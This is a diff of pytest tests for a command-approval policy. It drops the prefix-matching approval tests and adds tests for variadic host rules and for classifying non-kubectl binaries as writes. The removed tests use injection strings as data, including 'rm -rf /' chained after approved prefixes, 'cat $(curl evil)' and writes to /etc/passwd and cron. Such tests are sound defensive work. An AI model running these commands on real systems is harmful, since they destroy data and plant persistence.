@@ -3,7 +3,6 @@ import re
 
 import pytest
 from shared.policy import (
-    _is_approved,
     _is_blocked,
     _is_readonly_blocked,
     _K8S_COMPOUND_WRITES,
@@ -158,42 +157,6 @@ def test_readonly_not_blocked(cmd):
     assert not _is_readonly_blocked(cmd)
 
 
-# ---------------------------------------------------------------------------
-# _is_approved (prefix matching)
-# ---------------------------------------------------------------------------
-
-def test_approved_exact_match():
-    assert _is_approved("docker ps", ["docker ps"])
-
-
-def test_approved_prefix_match():
-    assert _is_approved("docker ps -a --format json", ["docker ps"])
-
-
-def test_approved_multiple_allowed_commands():
-    allowed = ["docker ps", "git status", "df -h"]
-    assert _is_approved("git status --short", allowed)
-    assert _is_approved("df -h /dev/sda", allowed)
-
-
-def test_not_approved_not_in_list():
-    assert not _is_approved("rm -rf /tmp", ["docker ps", "ls"])
-
-
-# _is_approved must reject shell operators (closes the "approved | tee" bypass) --------
-
-def test_approved_rejects_piped_command_even_with_matching_prefix():
-    # The read prefix is approved, but the pipe means it can't be treated as approved.
-    assert not _is_approved("docker restart nginx | tee /etc/cron.d/x", ["docker restart nginx"])
-
-
-def test_approved_rejects_chained_command():
-    assert not _is_approved("docker restart nginx && rm -rf /", ["docker restart nginx"])
-    assert not _is_approved("docker restart nginx; rm -rf /", ["docker restart nginx"])
-    assert not _is_approved("cat $(curl evil)", ["cat"])
-    assert not _is_approved("echo x > /etc/passwd", ["echo x"])
-
-
 def test_has_shell_operators():
     from shared.policy import has_shell_operators
     assert has_shell_operators("a | b")
@@ -220,6 +183,11 @@ def test_normalize_host_rule():
     assert normalize_host_rule({"bin": "sh", "args": ["-c", "a|b"]}) is None
     assert normalize_host_rule({"bin": "systemctl", "args": ["restart", "web-*"]}) is None   # partial glob
     assert normalize_host_rule({"bin": "a;b"}) is None                                        # operator in bin
+    # Trailing "..." variadic wildcard is allowed only as the final token.
+    assert normalize_host_rule({"bin": "helm", "args": ["list", "..."]}) == {"bin": "helm", "args": ["list", "..."]}
+    assert normalize_host_rule({"bin": "helm", "args": ["..."]}) == {"bin": "helm", "args": ["..."]}
+    assert normalize_host_rule({"bin": "helm", "args": ["...", "list"]}) is None             # not final -> rejected
+    assert normalize_host_rule({"bin": "helm", "args": ["list", "...", "x"]}) is None        # not final -> rejected
 
 
 def test_normalize_argv():
@@ -240,6 +208,26 @@ def test_host_rule_matches_positional_wildcards():
     assert not host_rule_matches(["systemctl", "restart", "a", "b"], r)    # arity differs
     assert not host_rule_matches(["docker", "restart", "nginx"], r)        # bin differs
     assert not host_rule_matches([], r)
+
+
+def test_host_rule_matches_trailing_variadic():
+    from shared.policy import host_rule_matches
+    r = {"bin": "helm", "args": ["list", "..."]}
+    assert host_rule_matches(["helm", "list"], r)                            # zero trailing args
+    assert host_rule_matches(["helm", "list", "prod"], r)                    # one
+    assert host_rule_matches(["helm", "list", "-n", "prod", "--all"], r)     # many
+    assert not host_rule_matches(["helm", "status", "prod"], r)              # prefix literal differs
+    assert not host_rule_matches(["helm"], r)                                # missing the "list" prefix
+    assert not host_rule_matches(["flux", "list"], r)                        # bin differs
+    # "..." alone after the bin matches any args (including none).
+    any_helm = {"bin": "helm", "args": ["..."]}
+    assert host_rule_matches(["helm"], any_helm)
+    assert host_rule_matches(["helm", "install", "rel", "./chart"], any_helm)
+    # A "*" before "..." still pins that one positional slot.
+    r2 = {"bin": "kubectl", "args": ["logs", "*", "..."]}
+    assert host_rule_matches(["kubectl", "logs", "pod-1"], r2)               # slot filled, no trailing
+    assert host_rule_matches(["kubectl", "logs", "pod-1", "-f"], r2)         # slot + trailing
+    assert not host_rule_matches(["kubectl", "logs"], r2)                    # slot unfilled
 
 
 def test_is_host_argv_approved_across_rules():
@@ -276,49 +264,6 @@ def test_to_argv():
     assert to_argv("ps aux | grep nginx") is None      # needs shell
     assert to_argv("ls *.txt") is None                 # glob needs shell
     assert to_argv("") is None
-
-
-def test_not_approved_empty_list():
-    assert not _is_approved("ls", [])
-
-
-def test_not_approved_partial_word_match():
-    # "docker" alone should not match "docker ps" prefix
-    assert not _is_approved("docker-compose up", ["docker ps"])
-
-
-def test_approved_strips_whitespace():
-    assert _is_approved("docker ps", ["  docker ps  "])
-
-
-def test_approved_command_strips_whitespace():
-    assert _is_approved("  docker ps -a  ", ["docker ps"])
-
-
-def test_not_approved_partial_word_prefix():
-    # "docker ps-anything" must not match "docker ps" - requires space boundary
-    assert not _is_approved("docker ps-malicious", ["docker ps"])
-
-
-def test_not_approved_broad_prefix_bypass():
-    # Allowing "docker" alone must not let "docker rm -f db" through
-    assert not _is_approved("docker rm -f db", ["docker logs"])
-
-
-def test_not_approved_kubectl_get_bypass():
-    # "kubectl get pods; rm -rf /" must not match "kubectl get"
-    # (command injection via semicolon after an approved prefix)
-    assert not _is_approved("kubectl get; rm -rf /", ["kubectl get"])
-
-
-def test_approved_exact_with_no_args():
-    # Exact match with no trailing args still works
-    assert _is_approved("ls", ["ls"])
-
-
-def test_not_approved_superset_command():
-    # "docker" alone as allowed should not grant "docker ps" (too broad an entry)
-    assert not _is_approved("docker ps", ["dockerd"])
 
 
 # ---------------------------------------------------------------------------
@@ -478,6 +423,36 @@ def test_dry_run_none_still_write(cmd):
 
 
 # set / certificate: distinct sub-subcommands are separately classified & approvable.
+
+# Default-deny: any non-kubectl, non-filter binary counts as a write (helm, flux, custom
+# tools). Previously such stages were invisible and slipped through as reads.
+
+@pytest.mark.parametrize("cmd", [
+    "helm install myrel ./chart -n prod",
+    "helm upgrade myrel ./chart",
+    "helm uninstall myrel",
+    "helm list",                                 # even a helm read: not a proven kubectl read
+    "flux reconcile kustomization apps",
+    "argocd app sync myapp",
+    "kustomize edit set image nginx=nginx:1.2",
+    "kubectl get pods | somecustomtool",         # a custom (non-filter) stage taints the pipe
+])
+def test_non_kubectl_binary_is_write(cmd):
+    from shared.policy import k8s_uses_unapprovable_binary
+    assert is_k8s_write(cmd)
+    assert k8s_uses_unapprovable_binary(cmd)
+
+
+@pytest.mark.parametrize("cmd", [
+    "kubectl get pods -A",
+    "kubectl get pods -o json | jq '.items[].metadata.name'",   # kubectl + pure filters = read
+    "kubectl logs mypod | grep ERROR | head -20",
+])
+def test_kubectl_reads_and_filters_stay_reads(cmd):
+    from shared.policy import k8s_uses_unapprovable_binary
+    assert not is_k8s_write(cmd)
+    assert not k8s_uses_unapprovable_binary(cmd)   # pure kubectl+filters are approvable/normal
+
 
 def test_set_and_certificate_compound_verbs():
     assert is_k8s_write("kubectl set image deploy/web app=nginx:1.2 -n prod")
